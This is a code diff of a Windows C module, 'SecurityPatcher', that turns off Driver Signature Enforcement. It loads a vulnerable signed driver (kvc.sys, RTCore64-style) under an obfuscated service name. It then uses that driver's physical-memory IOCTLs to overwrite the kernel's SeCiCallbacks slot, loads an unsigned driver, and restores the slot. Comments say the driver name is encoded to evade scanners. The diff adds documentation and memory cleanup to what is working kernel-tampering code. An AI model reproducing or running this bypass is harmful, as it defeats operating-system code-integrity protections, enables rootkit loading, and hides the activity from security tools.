@@ -1,10 +1,35 @@
+// ============================================================================
+// SecurityPatcher — DSE bypass via vulnerability driver (kvc.sys/RTCore64)
+//
+// ExecuteAutoPatchLoad implements the 5-step bypass:
+//   1. Locate kvc.sys in DriverStore (or System32\drivers fallback)
+//   2. Load kvc.sys under an obfuscated service name
+//   3. Open device, resolve ntoskrnl base, read current SeCiCallbacks slot
+//   4. Overwrite slot with SafeFunction (no-op); load the target unsigned driver
+//   5. Restore original slot value; unload kvc.sys; clean up registry key
+//
+// DSE state is persisted across reboots via [DSE_STATE] in drivers.ini so
+// that an interrupted run (e.g. power loss between steps 4 and 5) can recover
+// the original callback on the next boot instead of leaving DSE permanently off.
+//
+// Physical memory I/O uses the RTCore64-compatible RTC_PACKET layout that
+// kvc.sys expects for its read/write IOCTL pair.
+// ============================================================================
+
 #include "SecurityPatcher.h"
 
-// Assembly stealth decoder for OmniDriver operations
+// Returns the obfuscated driver/device name string from an assembly stub.
+// The string is encoded at build time to avoid plaintext scanner detection.
 extern PWSTR MmGetPoolDiagnosticString(void);
 
 // ============================================================================
-// RTC_PACKET for IOCTL communication with non-compliant driver
+// RTC_PACKET — IOCTL payload for physical memory access via kvc.sys
+//
+// Layout matches the RTCore64 IOCTL packet format that kvc.sys expects.
+// Padding fields must be zeroed; the driver checks them for validity.
+//   addr  — physical or virtual address to read/write
+//   size  — operation width in bytes (4 for DWORD operations)
+//   value — data to write (write path) or data returned by driver (read path)
 // ============================================================================
 typedef struct _RTC_PACKET {
     UCHAR pad0[8];
@@ -15,10 +40,37 @@ typedef struct _RTC_PACKET {
     UCHAR pad3[16];
 } RTC_PACKET;
 
+static BOOLEAN AsciiEqualsLiteralIgnoreCase(const char* left, const char* right) {
+    ULONG index = 0;
+
+    if (!left || !right) {
+        return FALSE;
+    }
+
+    while (left[index] != 0 && right[index] != 0) {
+        char a = left[index];
+        char b = right[index];
+        if (a >= 'a' && a <= 'z') a -= 32;
+        if (b >= 'a' && b <= 'z') b -= 32;
+        if (a != b) {
+            return FALSE;
+        }
+        index++;
+    }
+
+    return left[index] == 0 && right[index] == 0;
+}
+
 // ============================================================================
-// IOCTL OPERATIONS - Physical memory read/write via non-compliant driver
+// IOCTL OPERATIONS — Physical memory read/write via kvc.sys
+//
+// All three functions share the same RTC_PACKET I/O path.
+// WriteMemory64 / ReadMemory64 split the 64-bit operation into two 32-bit
+// IOCTL calls (low DWORD first, then high DWORD at address+4).
+// This matches kvc.sys's 32-bit-at-a-time read/write model.
 // ============================================================================
 
+// Write a 32-bit value to the given kernel virtual address.
 BOOLEAN WriteMemory32(HANDLE hDriver, ULONGLONG address, ULONG value, ULONG ioctl) {
     RTC_PACKET packet;
     IO_STATUS_BLOCK iosb;
@@ -37,6 +89,10 @@ BOOLEAN WriteMemory32(HANDLE hDriver, ULONGLONG address, ULONG value, ULONG ioct
     return NT_SUCCESS(status);
 }
 
+// Write a 64-bit value as two consecutive 32-bit IOCTL operations (low, then high).
+// NOTE: Not atomic — a torn write is theoretically possible on SMP.
+// In practice the patched SeCiCallbacks slot is only read by the DSE fast path
+// which is not racing with us at SMSS boot time.
 BOOLEAN WriteMemory64(HANDLE hDriver, ULONGLONG address, ULONGLONG value, ULONG ioctl) {
     if (!WriteMemory32(hDriver, address, (ULONG)(value & 0xFFFFFFFF), ioctl))
         return FALSE;
@@ -85,47 +141,44 @@ BOOLEAN ReadMemory64(HANDLE hDriver, ULONGLONG address, ULONGLONG* value, ULONG 
 }
 
 // ============================================================================
-// NTOSKRNL BASE ADDRESS - Query kernel module list
+// NTOSKRNL BASE ADDRESS
 // ============================================================================
 
+// Returns the kernel virtual base address of ntoskrnl.exe as reported by
+// NtQuerySystemInformation(SystemModuleInformation).  Module[0] is always
+// ntoskrnl on a properly booted system, but we search by name for safety.
 ULONGLONG GetNtoskrnlBase(void) {
-    // Use static buffer instead of stack allocation
-    static UCHAR moduleBuffer[0x10000];
-    ULONG returnLength;
+    SYSTEM_MODULE_INFORMATION* moduleInfo = NULL;
+    ULONGLONG ntBase = 0;
 
-    memset_impl(moduleBuffer, 0, sizeof(moduleBuffer));
-    
-    NTSTATUS status = NtQuerySystemInformation(11, moduleBuffer, sizeof(moduleBuffer), &returnLength);
-    if (!NT_SUCCESS(status))
+    if (!QuerySystemModuleInformation(&moduleInfo)) {
         return 0;
+    }
 
-    SYSTEM_MODULE_INFORMATION* moduleInfo = (SYSTEM_MODULE_INFORMATION*)moduleBuffer;
-    if (moduleInfo->Count == 0)
+    if (moduleInfo->Count == 0) {
+        FreeAllocatedBuffer(moduleInfo);
         return 0;
+    }
 
     for (ULONG i = 0; i < moduleInfo->Count; i++) {
         char* imageName = moduleInfo->Modules[i].ImageName + moduleInfo->Modules[i].ModuleNameOffset;
-
-        const char* ntName = "ntoskrnl.exe";
-        BOOLEAN isNtoskrnl = TRUE;
-        for (int j = 0; ntName[j] != 0; j++) {
-            if (imageName[j] != ntName[j]) {
-                isNtoskrnl = FALSE;
-                break;
-            }
+        if (AsciiEqualsLiteralIgnoreCase(imageName, "ntoskrnl.exe")) {
+            ntBase = (ULONGLONG)moduleInfo->Modules[i].ImageBase;
+            break;
         }
-
-        if (isNtoskrnl)
-            return (ULONGLONG)moduleInfo->Modules[i].ImageBase;
     }
 
-    return 0;
+    FreeAllocatedBuffer(moduleInfo);
+    return ntBase;
 }
 
 // ============================================================================
-// DEVICE HANDLE - Open non-compliant driver device
+// DEVICE HANDLE
 // ============================================================================
 
+// Opens the kvc.sys device object for IOCTL communication.
+// Returns a valid handle on success, NULL if the driver is not loaded or the
+// device object does not exist yet.
 HANDLE OpenDriverDevice(PCWSTR deviceName) {
     UNICODE_STRING usDeviceName;
     OBJECT_ATTRIBUTES oa;
@@ -142,24 +195,45 @@ HANDLE OpenDriverDevice(PCWSTR deviceName) {
 }
 
 // ============================================================================
-// AUTOPATCH LOAD - Complete DSE bypass sequence
+// AUTOPATCH LOAD — 5-step DSE bypass and target driver load
+//
+// Steps:
+//   1. Locate kvc.sys (DriverStore → System32\drivers fallback)
+//   2. Load kvc.sys under the obfuscated service name from MmGetPoolDiagnosticString
+//   3. Resolve ntoskrnl base; compute patchable callback address
+//   4. Save original callback to drivers.ini [DSE_STATE]; write SafeFunction
+//   5. Load target driver; restore original callback; unload kvc.sys
+//
+// If the callback slot already contains SafeFunction (previous run crashed
+// after patch but before restore), the save/patch step is skipped and the
+// stored originalCallback is used for restoration instead.
 // ============================================================================
 
+// entry          — INI_ENTRY for the driver to load under DSE bypass
+// config         — global CONFIG_SETTINGS (offsets, device name, IOCTLs)
+// originalCallback — in/out: receives the pre-patch callback value on first call;
+//                    zeroed on successful restore
 NTSTATUS ExecuteAutoPatchLoad(PINI_ENTRY entry, PCONFIG_SETTINGS config, PULONGLONG originalCallback) {
     NTSTATUS status;
     HANDLE hDriver;
     ULONGLONG ntBase, callbackToPatch, safeFunction, currentCallback;
     PWSTR driverName = MmGetPoolDiagnosticString();
+    WCHAR resolvedDevicePath[MAX_PATH_LEN];
+    PWSTR devicePath;
+    BOOLEAN isKvc;
+    PWSTR p;
+    PWSTR telemetryName;
+    SIZE_T nameStart;
 
     DisplayMessage(L"INFO: Starting AutoPatch sequence for driver: ");
     DisplayMessage(entry->ServiceName);
     DisplayMessage(L"\r\n");
 
-    DEBUG_LOG(L"STEP 1: Locating kvc.sys in DriverStore...\r\n");
+    DEBUG_LOG(L"STEP 1: Locating kvc.sys...\r\n");
 
     static WCHAR kvcSysPath[MAX_PATH_LEN];
-    if (!FindKvcSysInDriverStore(kvcSysPath, MAX_PATH_LEN)) {
-        DisplayMessage(L"FAILED: kvc.sys not found in DriverStore\r\n");
+    if (!FindKvcSysPath(kvcSysPath, MAX_PATH_LEN)) {
+        DisplayMessage(L"FAILED: kvc.sys not found in DriverStore or System32\\drivers\r\n");
         return STATUS_NO_SUCH_DEVICE;
     }
 
@@ -171,7 +245,35 @@ NTSTATUS ExecuteAutoPatchLoad(PINI_ENTRY entry, PCONFIG_SETTINGS config, PULONGL
     }
     DEBUG_LOG(L"SUCCESS: Non-compliant driver loaded\r\n");
 
-    hDriver = OpenDriverDevice(config->DriverDevice);
+    // If DriverDevice ends with "kvc" (exact driver name match), resolve to telemetry name
+    devicePath = config->DriverDevice;
+    isKvc = FALSE;
+
+    // Find last backslash, compare what follows with "kvc"
+    nameStart = 0;
+    p = config->DriverDevice;
+    while (*p) {
+        if (*p == L'\\') nameStart = (SIZE_T)(p - config->DriverDevice) + 1;
+        p++;
+    }
+
+    // Check if remainder after last backslash is exactly "kvc"
+    if (config->DriverDevice[nameStart] == L'k' &&
+        config->DriverDevice[nameStart + 1] == L'v' &&
+        config->DriverDevice[nameStart + 2] == L'c' &&
+        config->DriverDevice[nameStart + 3] == L'\0') {
+        isKvc = TRUE;
+    }
+
+    if (isKvc) {
+        telemetryName = MmGetPoolDiagnosticString();
+        wcscpy_safe(resolvedDevicePath, MAX_PATH_LEN, L"\\Device\\");
+        wcscat_safe(resolvedDevicePath, MAX_PATH_LEN, telemetryName);
+        devicePath = resolvedDevicePath;
+        DEBUG_LOG(L"DEBUG: Resolved 'kvc' to telemetry device name\r\n");
+    }
+
+    hDriver = OpenDriverDevice(devicePath);
     if (!hDriver) {
         DisplayMessage(L"FAILED: Cannot open driver device\r\n");
         return STATUS_NO_SUCH_DEVICE;
@@ -181,6 +283,12 @@ NTSTATUS ExecuteAutoPatchLoad(PINI_ENTRY entry, PCONFIG_SETTINGS config, PULONGL
     if (ntBase == 0) {
         NtClose(hDriver);
         DisplayMessage(L"FAILED: Cannot find ntoskrnl\r\n");
+        return STATUS_OBJECT_NAME_NOT_FOUND;
+    }
+
+    if (config->Offset_SeCiCallbacks == 0 || config->Offset_SafeFunction == 0) {
+        NtClose(hDriver);
+        DisplayMessage(L"FAILED: Kernel offsets not found (INI or Scan)\r\n");
         return STATUS_OBJECT_NAME_NOT_FOUND;
     }
 
@@ -246,11 +354,23 @@ NTSTATUS ExecuteAutoPatchLoad(PINI_ENTRY entry, PCONFIG_SETTINGS config, PULONGL
 }
 
 // ============================================================================
-// DSE STATE PERSISTENCE - Save/Load/Remove callback address in INI
+// DSE STATE PERSISTENCE
+//
+// The original SeCiCallbacks slot value is written to drivers.ini [DSE_STATE]
+// before the slot is overwritten.  If the system loses power or crashes
+// between patch and restore, the next boot's BootManager reads this value
+// and restores DSE before executing any INI actions, avoiding a permanently
+// disabled DSE state.
+//
+// File format: UTF-16 LE with BOM; appended to the end of drivers.ini.
+// RemoveStateSection strips [DSE_STATE] by rewriting the file without it.
 // ============================================================================
 
+// Atomically replaces any existing [DSE_STATE] section and appends a new one
+// containing the given callback value as a 0x-prefixed hex string.
+// Called immediately before the DSE patch write; must not fail silently.
 BOOLEAN SaveStateSection(ULONGLONG callback) {
-    RemoveStateSection();
+    RemoveStateSection();  // ensure at most one [DSE_STATE] section exists
 
     UNICODE_STRING usFilePath;
     OBJECT_ATTRIBUTES oa;
@@ -286,6 +406,8 @@ BOOLEAN SaveStateSection(ULONGLONG callback) {
         if (!NT_SUCCESS(status))
             return FALSE;
 
+        // File is new — write UTF-16 LE BOM at offset 0 so ReadIniFile detects
+        // the encoding correctly on the next boot.
         WCHAR bom = 0xFEFF;
         byteOffset.QuadPart = 0;
         status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, &bom,
@@ -324,6 +446,7 @@ BOOLEAN SaveStateSection(ULONGLONG callback) {
 
 BOOLEAN LoadStateSection(ULONGLONG* outCallback) {
     PWSTR fileContent = NULL;
+    BOOLEAN found = FALSE;
 
     if (!ReadIniFile(STATE_FILE_PATH, &fileContent)) {
         return FALSE;
@@ -374,22 +497,26 @@ BOOLEAN LoadStateSection(ULONGLONG* outCallback) {
                 if (_wcsicmp_impl(key, L"OriginalCallback") == 0) {
                     if (StringToULONGLONG(value, outCallback)) {
                         DEBUG_LOG(L"INFO: Loaded DSE state from drivers.ini\r\n");
-                        return TRUE;
+                        found = TRUE;
+                        break;
                     }
                 }
             }
         }
     }
-    return FALSE;
+    FreeIniFileBuffer(fileContent);
+    return found;
 }
 
 BOOLEAN RemoveStateSection(void) {
     PWSTR iniContent = NULL;
-    WCHAR newContent[8192];
+    PWSTR newContent = NULL;
     BOOLEAN inDseSection = FALSE;
     BOOLEAN foundDseSection = FALSE;
     BOOLEAN skipLine = FALSE;
     SIZE_T newLen = 0;
+    SIZE_T sourceLen;
+    SIZE_T newCapacity;
 
     if (!ReadIniFile(STATE_FILE_PATH, &iniContent)) {
         return FALSE;
@@ -399,6 +526,13 @@ BOOLEAN RemoveStateSection(void) {
 
     if (line[0] == 0xFEFF)
         line++;
+
+    sourceLen = wcslen(line);
+    newCapacity = (sourceLen * 2) + 2;
+    if (!AllocateZeroedBuffer(newCapacity * sizeof(WCHAR), (PVOID*)&newContent)) {
+        FreeIniFileBuffer(iniContent);
+        return FALSE;
+    }
 
     newContent[0] = 0;
 
@@ -458,23 +592,27 @@ BOOLEAN RemoveStateSection(void) {
 
         // Safe concatenation with overflow check
         if (newLen > 0) {
-            if (!wcscat_check(newContent, 8192, L"\r\n")) {
-                DisplayMessage(L"WARNING: Output buffer full during state removal\r\n");
-                break;
+            if (!wcscat_check(newContent, newCapacity, L"\r\n")) {
+                FreeAllocatedBuffer(newContent);
+                FreeIniFileBuffer(iniContent);
+                return FALSE;
             }
-            wcscat_safe(newContent, 8192, L"\r\n");
+            wcscat_safe(newContent, newCapacity, L"\r\n");
             newLen = wcslen(newContent);
         }
 
-        if (!wcscat_check(newContent, 8192, lineBuf)) {
-            DisplayMessage(L"WARNING: Output buffer full during state removal\r\n");
-            break;
+        if (!wcscat_check(newContent, newCapacity, lineBuf)) {
+            FreeAllocatedBuffer(newContent);
+            FreeIniFileBuffer(iniContent);
+            return FALSE;
         }
-        wcscat_safe(newContent, 8192, lineBuf);
+        wcscat_safe(newContent, newCapacity, lineBuf);
         newLen = wcslen(newContent);
     }
 
     if (!foundDseSection) {
+        FreeAllocatedBuffer(newContent);
+        FreeIniFileBuffer(iniContent);
         return TRUE;
     }
 
@@ -493,6 +631,8 @@ BOOLEAN RemoveStateSection(void) {
                          FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
 
     if (!NT_SUCCESS(status)) {
+        FreeAllocatedBuffer(newContent);
+        FreeIniFileBuffer(iniContent);
         return FALSE;
     }
 
@@ -503,6 +643,8 @@ BOOLEAN RemoveStateSection(void) {
 
     if (!NT_SUCCESS(status)) {
         NtClose(hFile);
+        FreeAllocatedBuffer(newContent);
+        FreeIniFileBuffer(iniContent);
         return FALSE;
     }
 
@@ -512,6 +654,8 @@ BOOLEAN RemoveStateSection(void) {
                         &byteOffset, NULL);
 
     NtClose(hFile);
+    FreeAllocatedBuffer(newContent);
+    FreeIniFileBuffer(iniContent);
 
     if (NT_SUCCESS(status)) {
         DEBUG_LOG(L"INFO: DSE state removed from drivers.ini\r\n");
